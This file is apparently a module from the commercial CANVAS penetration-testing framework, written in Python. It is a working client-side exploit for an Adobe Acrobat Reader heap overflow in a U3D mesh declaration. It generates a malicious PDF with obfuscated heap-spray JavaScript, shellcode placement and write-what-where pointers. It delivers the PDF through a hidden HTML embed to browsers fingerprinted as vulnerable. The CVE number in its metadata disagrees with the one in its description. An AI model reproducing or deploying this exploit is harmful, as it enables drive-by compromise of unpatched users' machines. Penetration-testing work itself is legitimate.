##ImmunityHeader v1 
###############################################################################
## File       :  acrobat_u3d_mesh.py
## Description:  
##            :  
## Created_On :  Sun Jan  3 13:36:04 2010
## Created_By :  Justin Seitz
## Modified_On:  Sun Jan  3 13:36:59 2010
## Modified_By:  Justin Seitz
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import copy
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.u3d import *

NAME='acrobat_u3d_mesh'
DESCRIPTION='Adobe Acrobat Reader Heap Overflow (ClodMeshDeclaration CVE-2009-2994)'

DOCUMENTATION={}
DOCUMENTATION['Date public']='10/13/2009'
DOCUMENTATION['References']='http://www.adobe.com/support/security/bulletins/apsb09-15.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Acrobat Reader <=8.1.6 and <=9.1.3 (SA|IE6,7,8|FF3.0.15,5.4) NODEP!'
DOCUMENTATION['CVE Name']='CVE-2009-3953'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2994"
DOCUMENTATION["Notes"]="""
This exploit works on Windows XP without DEP. DEP defaults to "opt-in" on Windows XP SP2/3. IE8 and modern Firefox
will opt-in to DEP, causing this exploit to fail silently. 

IE7 will work by default (opt-in). Obviously, if the machine does not support DEP (older machines)
then this exploit will also work.

"""

VERSION='0.3'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested with httpserver and sploitd.

Usage:
    ./commandlineInterface.py -p 5555 -v 1
    ./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_u3d_mesh -l 172.17.1.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
}

import re
from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *
from libs.ua_parser import user_agent_parser


class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME
        self.htmlfilename='file.html'
        self.refresh_rate=300
        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'temp.pdf'
        self.holesize       = int((1024*3)/20*20) #20 divisible
        self.basemem = 0x0C960000

        return
    
    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0
        
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0

        # Tested/verified on 8.1.6/9.1.3
        if major == 9:
            if minor == 1:
                if build <= 3:
                    return 100

        if major == 8:
            if minor == 1:
                if build <= 6:
                    return 100
            
        return 0

    def makeJS(self,scode):
        #Escaping the escaping hell
        def _toJS(s):
            if type(s) in set([long, int]) :
                s = struct.pack("<L",s) 
            if len(s) % 2 != 0:
                raise "Err! Should be even number of chars"
            r = ""
            for i in range (0,len(s)/2):
                r += "%u"+ "".join([ "%02x%02x"%(ord(s[i*2+1]),ord(s[i*2]))])
            return "unescape(\""+r+"\")"

        js = '''

         function prepareHoles(slide_size){
            var auxiliar = [];
            var size = 10000;
            var x = new Array(size);
            var hole = %%hole%%;
            /*
             * TODO: to gain 0.0000000001% more reliability pad it with
             * a far jump to shellcode instead of PPPPP..
             */
            var pad = unescape("%u5858");
            while (pad.length <= slide_size/2 - hole.length) 
                        pad += pad;

            for (i=0; i < size; i+=1) {
                    id = ""+i;
                    x[i] = hole + pad.substring(0,slide_size/2-hole.length-id.length) +id;
            }

            /* Intermitently free half of the array & garbageCollect */
            for (i=3*size/4; i < size-2; i+=2)
                            x[i]=null;

            /*FIX (and tell me how you did it)*/
            for (j=0;j<50000;j++){
                    auxiliar[0] = null;
                    auxiliar[0] = pad.substring(0, slide_size -1)+"A";
                    auxiliar[0] = null;
                }

            return x;
        }
     function prepareMemory(size){
            var mini_slide_size = 0x1000;
            var slide_size = 0x100000;
            var x = new Array(size);

            var pad = unescape("%ucccc");
            while (pad.length <= 32 ) 
                pad += pad;

            /* Bunch of nops */
            var nops = unescape("%u9090");
            while (nops.length <= mini_slide_size/2 - nops.length) 
                nops += nops;

            var shellcode = %%shellcode%%;
            var pointers = %%pointers%%;

            /*
             * TODO: to gain 0.0000000001% more reliability add a short jump 
             * at the end of the firsts nops to jump over the pointers.
             * Note that the first nops of the big (0x10000) chunk will be 
             * cuted off
             *
             * mini_slide_size len minichunk. (Always 0x1000 aligned) 
             */
            var chunk = nops.substring(0,32/2) + 
                        pointers + 
                        nops.substring(0,mini_slide_size/2-pointers.length 
                                                    - shellcode.length - 32) +
                        shellcode + 
                        pad.substring(0,32/2);
            chunk=chunk.substring(0,mini_slide_size/2);
            /*
             * slide_size len minichunk. (Always 0x1000 aligned) 
             */
            while (chunk.length <= slide_size/2) 
                chunk += chunk;

            for (i=0; i < size; i+=1) {
                        /* Debugging chunk id */
                        id = ""+i;
                        /* we cut the first bytes for better aligment */
                        x[i]=chunk.substring(16,slide_size/2 -32-id.length)+id;
                        }; 
        return x;
        }
        /*
         * Fill the memory with all needed chunks
         */
        var mem = prepareMemory(200);
        /*
         * Prepare the interleaved holes 
         */
        var holes = prepareHoles(%%holesize%%);


        /* Advance to the last page */
        //for (i=0;i<2;i++) 
        this.pageNum++;
        this.pageNum++;

        '''
        ## PREPAREHOLES:
        ## We will construct holesize bytes long chunks starting like this 
        ## |0         |6   |8       |C        |24                    |size
        ## |00000...  |0100|20100190|0000...  |    ......pad......   |
        ##                 \      \ 
        ##                 \      \ -Pointer: to controlled data
        ##                   \ -Flag: must be 1
        ## -Adobe will handle this ragged structure if the Flag is on.
        ## -Adobe will get 'what to write where' from the memory pointed 
        ##  by our supplied Pointer.   
        ##
        ## then allocate a bunch of those ..
        ## .. | chunk | chunk | chunk | chunck | chunk | chunck | chunck | ..
        ##    |XXXXXXX|XXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXXX|
        ##
        ## and then free some of them...
        ## .. | chunk | free  | chunk |  free  | chunk |  free  | chunck | ..
        ##    |XXXXXXX|       |XXXXXXX|        |XXXXXXX|        |XXXXXXXX|
        ##
        ## This way controlling when the next holesize malloc will be 
        ## followed with. We freed more than one hole so it became tolerant
        ## to some degree of malloc/free trace noise.
        ## Note the holesize is arbitrary it should be a fairly unused chunk size 
        ## not big enough to cause a different type of allocation.
        ## Also as we don't need to reference it from anywhere we don't care 
        ## where this hole layout is placed in memory.
        #js = js.replace("%%hole%%",_toJS("\x00"*10+ struct.pack("<H",1)+
          # struct.pack("<L",self.basemem +0x1020)+"\x00"*24))
        js = js.replace("%%hole%%",_toJS("0"*6+struct.pack("<H",1)+struct.pack("<L",self.basemem +0x1020)+"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJIIIIKKKKLLLLMMMM"))
        ## PREPAREMEMORY:
        ## In the next technique we make a big-chunk of 0x10000 bytes 
        ## repeating a 0x1000 bytes long mini-chunk of controled data. 
        ## Big-chunks are always allocated aligned to 0x1000. And if we 
        ## allocate a fair amount of big-chuncks (XPSPx) we'll be confident 
        ## Any 0x1000 aligned 0x1000 bytes from basemem to basemem + 0x10000
        ## will have our mini chunk
        ##
        ## A mini-chunk will have this look
        ## 
        ## |0         |10          |54         |?           |0xff0  |0x1000
        ## |00000...  |  POINTERS  |    nops   | shellcode  |  pad  |
        ##
        ## So we control what is in 0x0AXXXXXX. shellcode will be at basemem +0xX054+
        ## But we use basemem +0x1064.
        ## POINTERS looks like this:
        ## ...
        js = js.replace("%%pointers%%",
                        _toJS(    (struct.pack("<L",0x0)+
                                   ## where to write
                                   struct.pack("<L",0x7c49fb34/4)+
                                   ## must be greater tan 5 and less than x for getting us where we want
                                   struct.pack("<L",0x6)+
                                   ## what to write
                                   struct.pack("<L",self.basemem +0x1030)+
                                   ## autopointer for print magic(tm)
                                   struct.pack("<L",self.basemem +0x1034)+
                                   ## function pointers for print magic(tm) 
                                   ## pointing to our shellcode
                                   struct.pack("<L",self.basemem +0x1065)*12)))
        js = js.replace("%%shellcode%%",_toJS(scode + "\xcc" * (len(scode)%2)))
        js = js.replace("%%holesize%%","%d"%self.holesize)
        
        #remove comments from payload and obfuscate JS
        return self.obfuscate_javascript(re.compile(r"/\*.*?\*/", re.MULTILINE|re.DOTALL).sub("", js))

    def setDocJS(self, doc, content):
        #create the js entry first
        doc.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        doc.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        doc.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        doc.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('First'))
        doc.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        doc.trailer['/Root'][NameObject('OpenAction')] = DictionaryObject()

        #set the js content
        jsobject = StreamObject()
        jsobject._data = content

        jsdict=doc.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')] = NameObject('/JavaScript')
        jsdict[NameObject('/JS')] = jsobject.flateEncode()

    def addU3DAnnot(self,page,u3dStr):
        appearance=DictionaryObject()
        appearance[NameObject("/Subtype")]=NameObject("/Form")
        appearance[NameObject("/Matrix")]=ArrayObject([NumberObject("1"), NumberObject("0"), NumberObject("0"), NumberObject("1"), NumberObject("0"), NumberObject("0")])
        appearance[NameObject("/BBox")]=ArrayObject([NumberObject("0"), NumberObject("0"), NumberObject("800"), NumberObject("600")])

        page[NameObject('/Annots')]=ArrayObject([DictionaryObject()])
        page['/Annots'][0][NameObject('/Subtype')]=NameObject("/3D")
        page['/Annots'][0][NameObject('/F')]=NumberObject(68)
        page['/Annots'][0][NameObject('/Rect')]=ArrayObject([NumberObject(0), NumberObject(0), NumberObject(800), NumberObject(600)])
        page['/Annots'][0][NameObject('/Type')]=NameObject("/Annot")
        page['/Annots'][0][NameObject('/AP')]=DictionaryObject( { NameObject("/N") : appearance } )

        data=StreamObject()
        data._data=u3dStr
        page['/Annots'][0][NameObject('/3DD')]=data.flateEncode()
        page['/Annots'][0]['/3DD'][NameObject('/Type')]=NameObject("/3D")
        page['/Annots'][0]['/3DD'][NameObject('/Subtype')]=NameObject("/U3D")    
        page['/Annots'][0][NameObject('/3DA')]=DictionaryObject( { NameObject("/DIS"):NameObject("/I"), NameObject("/A"):NameObject("/PO"), NameObject("/D"):NameObject("/XD") } )

    def setPageJS(self,page,js):
        jsobject = StreamObject()
        jsobject._data = js
        
        pageJS = DictionaryObject()
        pageJS[NameObject("/S")] = NameObject("/JavaScript")
        pageJS[NameObject("/JS")] = jsobject.flateEncode()
        page[NameObject("/AA")] =  DictionaryObject()
        page["/AA"][NameObject("/O")] = pageJS

    def getU3D(self,size,overrun=1):
        u3d = U3D()
        meshName="MESH"
        modChain = u3d.addDeclaration()
        modChain.setBlocktype(0xffffff14)
        modChain.child_structure.name=meshName
        ##############CLOD Mesh Declaration###################
        mesh = Block(blocktype=0xffffff31)
        mesh.data=U3DString(meshName).write()
        mesh.data+=pack("<LLLLLLLLLL",0,0,0x1,size,0x4,0,0,0,0x1,0)
        mesh.data+=pack("<LL",0x0,0x0) #CLOD Desc
        mesh.data+=pack("<LLLLLffffffff",size+overrun,size+overrun+1,0x012c,0x012c,0x012c,0,0,0,0,0,0,0,0) 
        mesh.data+=pack("<L",0)
        modChain.child_structure.modifiers.append(mesh)
        ################################
        block = Block(0xffffff3c)
        block.data = U3DString(meshName).write()
        block.data += pack("<L", 0)*4 + pack("<L", 1) *12 #This block just need to be *present*
        u3d.addDeclaration(block)
        return u3d.write()

    def copy_page(self, page):
        p = PageObject(page)
        p.update(page)
        p.mediaBox = copy.copy(page.mediaBox)
        return p

    def makePDF(self):
        #The shellcode
        scode   = self.createShellcode()

        #Open the potentially provided pdf file (TODO check exception)
        basepdf = PdfFileReader(file(self.source_pdf,'rb'))

        #set the openactionJS that will arrange the memory layout..
        self.setDocJS(basepdf, self.makeJS(scode))

        #Read all the basepdf pages
        pages = []
        for i in range(0,basepdf.getNumPages()):
            print "Read page %d"%i 
            pages.append(basepdf.getPage(i))

        # need 3 or more pages because the buggy stream should be proccesed
        # after the we arrange the memory via JS massage in openaction
        for i in range(basepdf.getNumPages(),3):
            pages.append(self.copy_page(pages[len(pages)-1]))
        #OK we have 3 pages or more...

        #Add set the JS of the trampoline page
        self.setPageJS(pages[1],'''this.pageNum++;''')

        #get third page and add the bug
        self.addU3DAnnot(pages[2],self.getU3D(self.holesize/20))
        self.setPageJS(pages[2],self.obfuscate_javascript("this.print({bUI: true, bSilent: false, bShrinkToFit: false}); "))


        #Prepare the output pdf
        outpdf = PdfFileWriter()
        for p in pages :
            outpdf.addPage(p)

        root=outpdf._root.getObject()
        root.update({NameObject('/Names'):basepdf.trailer['/Root']['/Names']})

        #...and render the ituput pdf.
        output = StringIO()
        outpdf.write(output)
        return output.getvalue()



    def makeHTML(self):
        webpage="""
        <HTML>
        <body onload="foo();">
        <EMBED src="PDFSOURCE" HIDDEN="TRUE" >
        </EMBED>
        <script language="JavaScript">
            function reload() {
               window.location = "/done";
            }
            function foo() {
               setTimeout('reload()', 5000);
            }
        </script>
        </body>
        </HTML>
        """.replace("PDFSOURCE", self.dest_pdf)
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            b.setBody(self.makePDF())
        elif clientheader.URL.count("done"):
            self.log("Exploit failed - patched?")
            #we will kill IE on a bad failure, so the only way this would happen is if 
            #is_vulnerable returned True (non-zero) but we were patched!
            return None, None 
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        file(self.dest_pdf,'wb+').write(self.filedata)
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
